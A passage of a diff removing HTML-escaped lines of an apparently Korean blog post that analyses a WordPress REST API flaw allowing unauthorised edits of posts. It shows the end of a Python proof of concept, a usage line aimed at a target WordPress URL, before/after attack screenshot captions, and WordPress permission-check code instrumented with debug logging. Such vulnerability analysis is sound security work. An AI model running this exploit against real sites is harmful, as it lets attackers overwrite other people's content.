-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;api_url&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'* Update complete!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Exploit Code에 대한 간략한 설명은 아래와 같습니다.&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;argv[1] : 대상 도메인&lt;br /&gt;
-argv[2] : 대상 게시물 번호&lt;br /&gt;
-argv[3] : 대상 게시물에 변경할 내용&lt;br /&gt;
-python poc.py [대상 도메인] [게시물 번호] [변경할 내용을 담은 파일]&lt;br /&gt;
-ex) python poc.py http://IP/wordpress/ 4 content&lt;br /&gt;
-&lt;br /&gt;
-존재하는 게시물 목록을 조회하고 JSON인코딩한 데이터를 공격자가 지정한 게시물의 내용을 전송합니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;취약점-공격-테스트&quot;&gt;취약점 공격 테스트&lt;/h5&gt;
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_5.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-5]
-  공격 전 게시물 내용
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_6.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-6]
-  Exploit Code 실행
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_7.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-7]
-  공격 후 게시물 내용
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update_item_permissions_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_dir&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/tmp/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#fclose($log_file);
-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_post_type_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;post_type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;var_export&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;w+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;var_export&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'author'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;var_export&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sticky'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;var_export&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;check_assign_terms_permission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;check_update_permission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_edit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to edit this post.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'author'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_current_user_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'author'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;current_user_can&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;cap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;edit_others_posts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_edit_others'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to update posts as this user.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sticky'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;current_user_can&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;cap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;edit_others_posts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_assign_sticky'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to make posts sticky.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
